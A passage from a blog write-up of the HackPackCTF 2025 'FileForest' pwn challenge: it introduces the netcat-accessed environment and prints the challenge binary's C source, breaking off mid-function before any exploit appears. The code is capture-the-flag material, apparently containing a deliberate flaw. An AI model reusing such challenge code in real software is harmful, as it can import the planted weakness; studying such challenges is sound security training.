<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="HackPackCTF 2025: FileForest" /><meta property="og:locale" content="en" /><meta name="description" content="Category: PWN Difficulty: Easy Points: 500" /><meta property="og:description" content="Category: PWN Difficulty: Easy Points: 500" /><link rel="canonical" href="https://www.wtthomas.org/posts/HackPackCTF-FileForest/" /><meta property="og:url" content="https://www.wtthomas.org/posts/HackPackCTF-FileForest/" /><meta property="og:site_name" content="Taylor Thomas" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-05-07T04:00:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackPackCTF 2025: FileForest" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-05-08T04:00:00-04:00","datePublished":"2025-05-07T04:00:00-04:00","description":"Category: PWN Difficulty: Easy Points: 500","headline":"HackPackCTF 2025: FileForest","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.wtthomas.org/posts/HackPackCTF-FileForest/"},"url":"https://www.wtthomas.org/posts/HackPackCTF-FileForest/"}</script><title>HackPackCTF 2025: FileForest | Taylor Thomas</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Taylor Thomas"><meta name="application-name" content="Taylor Thomas"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script> <script defer src="/assets/js/dist/post.min.js"></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">Taylor Thomas</a><p class="site-subtitle fst-italic mb-0">CS @ NCSU. Engineering + Brisket + Toyotas = Happiness</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/cv/" class="nav-link"> <i class="fa-fw fas fa-file-pdf"></i> <span>CV</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/wtthoma4" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://www.wtthomas.org" aria-label="links" target="_blank" rel="noopener noreferrer" > <i class="fa-solid fa-link"></i> </a> <a href="javascript:location.href = 'mailto:' + ['taylor','wtthomas.org'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/taylor-t-a18294266/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>HackPackCTF 2025: FileForest</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="false"><header><h1 data-toc-skip>HackPackCTF 2025: FileForest</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1746604800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > May 7, 2025 </time> </span> <span> Updated <time data-ts="1746691200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > May 8, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/wtthoma4">Taylor Thomas</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2142 words" > <em>11 min</em> read</span></div></div></div></header><div class="content"><ul><li>Category: <strong>PWN</strong><li>Difficulty: <strong>Easy</strong><li>Points: <strong>500</strong></ul><p>FileForest begins by using netcat to access a remote environment. You can explore this environment using <code class="language-plaintext highlighter-rouge">ls</code>, <code class="language-plaintext highlighter-rouge">cd</code>, and <code class="language-plaintext highlighter-rouge">cat</code>. You should quickly discover <code class="language-plaintext highlighter-rouge">flag.txt</code>, amongst some other text files, using some of the programs built into the environment. You won’t be able to access the directory where the raw file is stored, but you can read the other files there using the <code class="language-plaintext highlighter-rouge">fileforest</code> binary which <em>is</em> accessible. The catch: there is some mechanism in <code class="language-plaintext highlighter-rouge">fileforest</code> which intercepts “flag” and throws an invalid argument error. Let’s investigate!</p><p>Further exploration should reveals the source code of the <code class="language-plaintext highlighter-rouge">fileforest</code> binary, included below:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;limits.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/openat2.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="k">static</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">state_directory</span> <span class="o">=</span> <span class="s">"/var/lib/fileforest"</span><span class="p">;</span>
<span class="cp">#define FOREST_READ_BUFFER_SIZE 4096
</span>
<span class="c1">// Wrapper for the openat2(2) system call.</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">do_openat2</span><span class="p">(</span><span class="kt">int</span> <span class="n">dirfd</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="n">open_how</span> <span class="n">how</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">result</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_openat2</span><span class="p">,</span> <span class="n">dirfd</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">how</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">how</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;</span> <span class="n">INT_MAX</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Invalid result from openat2: %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Opens the directory path within the directory referred to by file</span>
<span class="c1">// descriptor base_fd. Ensure that name lookup never proceeds outside</span>
<span class="c1">// base_fd.</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">open_beneath</span><span class="p">(</span><span class="kt">int</span> <span class="n">base_fd</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">path</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">do_openat2</span><span class="p">(</span><span class="n">base_fd</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span>
        <span class="p">(</span><span class="k">struct</span> <span class="n">open_how</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">flags</span><span class="p">,</span>
            <span class="p">.</span><span class="n">resolve</span> <span class="o">=</span> <span class="n">RESOLVE_BENEATH</span> <span class="o">|</span> <span class="n">RESOLVE_NO_MAGICLINKS</span><span class="p">,</span>
        <span class="p">});</span>
<span class="p">}</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">forest_state</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">working_dir</span><span class="p">;</span>
<span class="p">}</span> <span class="n">forest_state</span><span class="p">;</span>

<span class="c1">// Safely opens a path within state-&gt;working_dir.</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">forest_open</span><span class="p">(</span><span class="n">forest_state</span> <span class="k">const</span><span class="o">*</span> <span class="n">state</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">path</span><span class="p">,</span>
                    <span class="kt">uint64_t</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">open_beneath</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">working_dir</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">do_read</span><span class="p">(</span><span class="n">forest_state</span> <span class="k">const</span><span class="o">*</span> <span class="n">state</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">arg</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"A path is required.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">file</span> <span class="o">=</span> <span class="n">forest_open</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not open file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">arg</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">bool</span> <span class="n">ends_newline</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">FOREST_READ_BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
        <span class="kt">ssize_t</span> <span class="k">const</span> <span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">read_bytes</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Could not read file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">arg</span><span class="p">);</span>
            <span class="n">close</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">read_bytes</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">fwrite</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_bytes</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>

        <span class="c1">// Safety: read_bytes &gt; 0.</span>
        <span class="n">ends_newline</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">read_bytes</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Ensure we end the file with a newline, but don't print a double newline.</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ends_newline</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">putc</span><span class="p">(</span><span class="sc">'\n'</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">close</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">cmp_file_names</span><span class="p">(</span><span class="kt">void</span> <span class="k">const</span><span class="o">*</span> <span class="n">pa</span><span class="p">,</span> <span class="kt">void</span> <span class="k">const</span><span class="o">*</span> <span class="n">pb</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="k">const</span><span class="o">**</span><span class="p">)</span> <span class="n">pa</span><span class="p">;</span>
    <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">b</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="k">const</span><span class="o">**</span><span class="p">)</span> <span class="n">pb</span><span class="p">;</span>

    <span class="n">bool</span> <span class="n">a_is_dir</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="sc">'.'</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">bool</span> <span class="n">b_is_dir</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="sc">'.'</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// Sort directory names first.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">a_is_dir</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">b_is_dir</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">a_is_dir</span> <span class="o">&amp;&amp;</span> <span class="n">b_is_dir</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">do_list_files</span><span class="p">(</span><span class="kt">DIR</span><span class="o">*</span> <span class="n">dir</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// We do not handle the case of growing. There will be no directories with</span>
    <span class="c1">// more than 512 entries.</span>
    <span class="k">const</span> <span class="kt">size_t</span> <span class="n">names_capacity</span> <span class="o">=</span> <span class="mi">512</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">files_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">char</span><span class="o">**</span> <span class="k">const</span> <span class="n">files</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">names_capacity</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">files</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">files</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not list names.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="c1">// There is no cleanup to do.</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">struct</span> <span class="n">dirent</span><span class="o">*</span> <span class="n">de</span><span class="p">;</span> <span class="c1">// directory entry pointer</span>

    <span class="k">while</span> <span class="p">((</span><span class="n">de</span> <span class="o">=</span> <span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">files_size</span> <span class="o">==</span> <span class="n">names_capacity</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not list names.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">assert</span><span class="p">(</span><span class="n">files_size</span> <span class="o">&lt;</span> <span class="n">names_capacity</span><span class="p">);</span>

        <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">name</span> <span class="o">=</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">;</span>

        <span class="c1">// Don't show empty or hidden entries.</span>
        <span class="c1">// SAFETY: name is a null-terminated string, so reading the first byte is</span>
        <span class="c1">// always okay.</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span> <span class="o">||</span> <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'.'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kt">char</span><span class="o">*</span> <span class="n">copy</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">copy</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not list names.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Show the file if its name does not contain a "." (assumed to be a directory), or</span>
        <span class="c1">// if the file contains ".txt".</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">copy</span><span class="p">,</span> <span class="s">"."</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">strstr</span><span class="p">(</span><span class="n">copy</span><span class="p">,</span> <span class="s">".txt"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Only list .txt files</span>
        <span class="n">files</span><span class="p">[</span><span class="n">files_size</span><span class="p">]</span> <span class="o">=</span> <span class="n">copy</span><span class="p">;</span>
        <span class="o">++</span><span class="n">files_size</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">qsort</span><span class="p">(</span><span class="n">files</span><span class="p">,</span> <span class="n">files_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">files</span><span class="p">),</span> <span class="n">cmp_file_names</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">files_size</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="nl">cleanup:</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">files_size</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">free</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="n">free</span><span class="p">(</span><span class="n">files</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">do_ls</span><span class="p">(</span><span class="n">forest_state</span> <span class="k">const</span><span class="o">*</span> <span class="n">state</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">path</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">path</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">path</span> <span class="o">=</span> <span class="s">"."</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="k">const</span> <span class="n">target_fd</span> <span class="o">=</span> <span class="n">forest_open</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span> <span class="o">|</span> <span class="n">O_DIRECTORY</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">target_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not list files.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">DIR</span><span class="o">*</span> <span class="n">dr</span> <span class="o">=</span> <span class="n">fdopendir</span><span class="p">(</span><span class="n">target_fd</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not open current directory.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">target_fd</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">do_list_files</span><span class="p">(</span><span class="n">dr</span><span class="p">);</span>

    <span class="n">closedir</span><span class="p">(</span><span class="n">dr</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">do_summarize</span><span class="p">(</span><span class="n">forest_state</span> <span class="k">const</span><span class="o">*</span> <span class="n">state</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">path</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">path</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"A path is required.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">file</span> <span class="o">=</span> <span class="n">forest_open</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Could not open file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">size_t</span> <span class="n">file_length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">newline_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
